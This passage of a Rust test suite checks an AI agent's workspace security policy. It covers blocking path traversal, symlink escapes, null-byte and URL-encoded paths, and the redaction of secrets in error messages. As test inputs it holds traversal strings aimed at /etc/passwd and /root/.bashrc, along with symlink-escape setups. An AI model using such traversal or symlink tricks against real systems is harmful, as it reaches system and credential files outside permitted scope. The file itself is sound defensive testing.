        .unwrap_or_else(|_| workspace.clone());

    let policy = SecurityPolicy {
        workspace_dir: canonical_workspace.clone(),
        ..SecurityPolicy::default()
    };

    // A resolved path inside the workspace should be allowed
    let inside = canonical_workspace.join("subdir").join("file.txt");
    assert!(
        policy.is_resolved_path_allowed(&inside),
        "path inside workspace should be allowed"
    );

    // A resolved path outside the workspace should be blocked
    let canonical_temp = std::env::temp_dir()
        .canonicalize()
        .unwrap_or_else(|_| std::env::temp_dir());
    let outside = canonical_temp.join("outside_workspace_openhuman");
    assert!(
        !policy.is_resolved_path_allowed(&outside),
        "path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&workspace);
}

#[test]
fn resolved_path_blocks_root_escape() {
    let policy = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/openhuman_user/project"),
        ..SecurityPolicy::default()
    };

    assert!(
        !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
        "resolved path to /etc/passwd must be blocked"
    );
    assert!(
        !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
        "resolved path to /root/.bashrc must be blocked"
    );
}

#[cfg(unix)]
#[test]
fn resolved_path_blocks_symlink_escape() {
    use std::os::unix::fs::symlink;

    let root = std::env::temp_dir().join("openhuman_test_symlink_escape");
    let workspace = root.join("workspace");
    let outside = root.join("outside_target");

    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::create_dir_all(&outside).unwrap();

    // Create a symlink inside workspace pointing outside
    let link_path = workspace.join("escape_link");
    symlink(&outside, &link_path).unwrap();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        ..SecurityPolicy::default()
    };

    // The resolved symlink target should be outside workspace
    let resolved = link_path.canonicalize().unwrap();
    assert!(
        !policy.is_resolved_path_allowed(&resolved),
        "symlink-resolved path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn is_path_allowed_blocks_null_bytes() {
    let policy = default_policy();
    assert!(
        !policy.is_path_string_allowed("file\0.txt"),
        "paths with null bytes must be blocked"
    );
}

#[test]
fn is_path_allowed_blocks_url_encoded_traversal() {
    let policy = default_policy();
    assert!(
        !policy.is_path_string_allowed("..%2fetc%2fpasswd"),
        "URL-encoded path traversal must be blocked"
    );
    assert!(
        !policy.is_path_string_allowed("subdir%2f..%2f..%2fetc"),
        "URL-encoded parent dir traversal must be blocked"
    );
}

// Regression: #1941. The allowlist-miss Err return used to echo the full
// untruncated command, leaking secrets in args (e.g. an Authorization Bearer
// header in a `curl` invocation that the agent issued). The log already
// truncated at 80 chars; the Err path now matches.
#[test]
fn validate_command_truncates_secrets_in_allowlist_miss_error() {
    // Use a base command NOT on the default allowlist so we hit the
    // allowlist-miss branch. Pad the command so the secret sits past byte 80.
    let prefix = "totallybogusbin --really-long-flag-that-eats-the-budget=";
    let padding = "x".repeat(80usize.saturating_sub(prefix.len()));
    let secret = "Bearer SECRETTOKEN_DO_NOT_LEAK_ME_123";
    let cmd = format!("{prefix}{padding} -H \"Authorization: {secret}\"");
    assert!(
        cmd.len() > 80,
        "fixture must be longer than the 80-char truncation cap"
    );
    assert!(
        cmd.contains(secret),
        "fixture must contain the secret token so the test can check it leaks"
    );

    let p = default_policy();
    let err = p
        .validate_command_execution(&cmd, false)
        .expect_err("unknown command should be rejected");

    assert!(
        !err.contains(secret),
        "Err return leaked the secret past the 80-char truncation boundary: {err}"
    );
    assert!(
        err.starts_with("Command not allowed by security policy: "),
        "Err return should still carry the policy-decision prefix: {err}"
    );
}

// Regression: #1941. Mirrors the log-truncation multi-byte safety net (#1813)
// for the Err path. A multi-byte UTF-8 char straddling byte 80 of the command
// would panic the formatter if we did a naked `&command[..80]` slice.
#[test]
fn validate_command_err_truncation_handles_multibyte_char_at_boundary() {
    let prefix = "totallybogusbin ";
    let filler = "a".repeat(80 - prefix.len() - 1);
    let cmd = format!("{prefix}{filler}魔 trailing");
    assert!(
        !cmd.is_char_boundary(80),
        "fixture must place a multi-byte char across byte 80"
    );

    let p = default_policy();
    let result = p.validate_command_execution(&cmd, false);
    assert!(
        result.is_err(),
        "fixture must hit the allowlist-miss Err path"
    );
}

// ── validate_path_within_root ─────────────────────────────────────────────

#[test]
fn validate_path_within_root_allows_contained_path() {
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("prompt.md");
    std::fs::write(&file, b"hello").unwrap();
    let result = validate_path_within_root(&file, root.path());
    assert!(result.is_ok(), "contained path must be allowed: {result:?}");
    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
}

#[test]
fn validate_path_within_root_blocks_parent_traversal() {
    let root = tempfile::tempdir().unwrap();
    let subdir = root.path().join("prompts");
    std::fs::create_dir(&subdir).unwrap();
    // Create a file one level above the prompts subdir but still within root.
    let victim = root.path().join("secret.txt");
    std::fs::write(&victim, b"secret").unwrap();
    // Construct a traversal path: <root>/prompts/../secret.txt
    let traversal = subdir.join("..").join("secret.txt");
    // With the prompts dir as root, the traversal must be blocked.
    let result = validate_path_within_root(&traversal, &subdir);
    assert!(
        result.is_err(),
        "path escaping root via '..' must be blocked"
    );
}

#[test]
fn validate_path_within_root_blocks_absolute_escape() {
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("a.md");
    std::fs::write(&file, b"x").unwrap();
    // Use a completely different tempdir as the root — file is outside it.
    let other_root = tempfile::tempdir().unwrap();
    let result = validate_path_within_root(&file, other_root.path());
    assert!(
        result.is_err(),
        "path outside root must be blocked: {result:?}"
    );
}

#[test]
fn validate_path_within_root_fails_on_nonexistent_candidate() {
    let root = tempfile::tempdir().unwrap();
    let missing = root.path().join("does_not_exist.md");
    // canonicalize() will fail — we expect an error, not a panic.
    let result = validate_path_within_root(&missing, root.path());
    assert!(
        result.is_err(),
        "non-existent candidate must return an error"
    );
}

#[test]
fn validate_path_within_root_blocks_symlink_escape() {
    let root = tempfile::tempdir().unwrap();
    let prompts_dir = root.path().join("prompts");
    std::fs::create_dir(&prompts_dir).unwrap();
    // Create a target file outside the prompts dir.
    let outside = root.path().join("outside.txt");
    std::fs::write(&outside, b"sensitive").unwrap();
    // Create a symlink inside prompts/ pointing outside.
    let link = prompts_dir.join("evil.md");
    #[cfg(unix)]
    std::os::unix::fs::symlink(&outside, &link).unwrap();
    #[cfg(not(unix))]
    {
        // Skip symlink test on non-Unix where symlink creation may require
        // elevated privileges.
        return;
    }
    let result = validate_path_within_root(&link, &prompts_dir);
    assert!(
        result.is_err(),
        "symlink escaping prompt root must be blocked"
    );
}

// ── validate_path / validate_parent_path (async) ────────────────────────────

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_outside_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let secret = outside.path().join("secret.txt");
    std::fs::write(&secret, "secret").unwrap();
    let link = workspace.path().join("link.txt");
    std::os::unix::fs::symlink(&secret, &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("link.txt").await.is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_forbidden_path() {
    let workspace = tempfile::tempdir().unwrap();
    // /etc/hostname is readable on most Unix systems
    let link = workspace.path().join("link");
    std::os::unix::fs::symlink("/etc/hostname", &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["/etc".to_string()],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("link").await.is_err());
}

#[tokio::test]
async fn validate_path_allows_regular_file_in_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    let file = workspace.path().join("data.txt");
    std::fs::write(&file, "hello").unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let result = policy.validate_path("data.txt").await;
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
}

#[tokio::test]
async fn validate_path_returns_err_for_nonexistent_path() {
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("does_not_exist.txt").await.is_err());
}

#[tokio::test]
async fn validate_parent_path_allows_new_file() {
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let result = policy.validate_parent_path("newfile.txt").await;
    assert!(result.is_ok());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_blocks_symlinked_parent_dir() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let link_dir = workspace.path().join("subdir");
    std::os::unix::fs::symlink(outside.path(), &link_dir).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy
        .validate_parent_path("subdir/newfile.txt")
        .await
        .is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_relative_forbidden_entry() {
    // Regression: relative forbidden entries (e.g. "secrets") must match after
    // canonicalization. Before the fix, "secrets" was never resolved against the
    // workspace root, so workspace/link -> workspace/secrets/ passed the check.
    let workspace = tempfile::tempdir().unwrap();
    let secrets_dir = workspace.path().join("secrets");
    std::fs::create_dir_all(&secrets_dir).unwrap();
    let secret_file = secrets_dir.join("token.txt");
    std::fs::write(&secret_file, "s3cr3t").unwrap();
    let link = workspace.path().join("link");
    std::os::unix::fs::symlink(&secrets_dir, &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["secrets".to_string()],
        ..SecurityPolicy::default()
    };
    // Direct path into the forbidden dir is blocked.
    assert!(policy.validate_path("secrets/token.txt").await.is_err());
    // Symlink that resolves into the forbidden dir is also blocked.
    assert!(policy.validate_path("link/token.txt").await.is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_blocks_forbidden_path() {
    // Covers lines 888-896: the forbidden-path check inside validate_parent_path.
    let workspace = tempfile::tempdir().unwrap();
    let secrets_dir = workspace.path().join("secrets");
    std::fs::create_dir_all(&secrets_dir).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["secrets".to_string()],
        ..SecurityPolicy::default()
    };
    // Writing a new file directly into the forbidden dir must be blocked.
    assert!(policy
        .validate_parent_path("secrets/output.csv")
        .await
        .is_err());
}

// ── tilde expansion in validate_path / validate_parent_path ──────────────────

#[cfg(unix)]
#[tokio::test]
async fn validate_path_expands_tilde_before_workspace_join() {
    // ~/... must be resolved against the real home dir, not literally joined onto
    // workspace_dir. With workspace_only:false and no forbidden entries, is_path_string_allowed
    // passes ~/file. After tilde expansion the file is outside the temp workspace, so we
    // expect "Resolved path escapes workspace" — not "Failed to resolve path" (which would
    // indicate the literal ~/... was appended to workspace_dir and canonicalize failed there).
    let workspace = tempfile::tempdir().unwrap();
    let home = dirs::home_dir().unwrap();
    let target = home.join("openhuman_tilde_validate_path_test.txt");
    std::fs::write(&target, "test").unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let err = policy
        .validate_path("~/openhuman_tilde_validate_path_test.txt")
        .await
        .unwrap_err();
    let _ = std::fs::remove_file(&target);
    assert!(
        err.contains("Resolved path escapes workspace"),
        "expected workspace-escape error (tilde correctly expanded); got: {err}"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_expands_tilde_before_workspace_join() {
    // Same as above but for validate_parent_path: writing ~/new_file.txt in
    // non-workspace-only mode must escape-check via the real home path, not a literal ~/
    // inside workspace_dir.
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let err = policy
        .validate_parent_path("~/openhuman_tilde_validate_parent_test.txt")
        .await
        .unwrap_err();
    assert!(
        err.contains("Resolved parent path escapes workspace"),
        "expected workspace-escape error (tilde correctly expanded); got: {err}"
    );
}
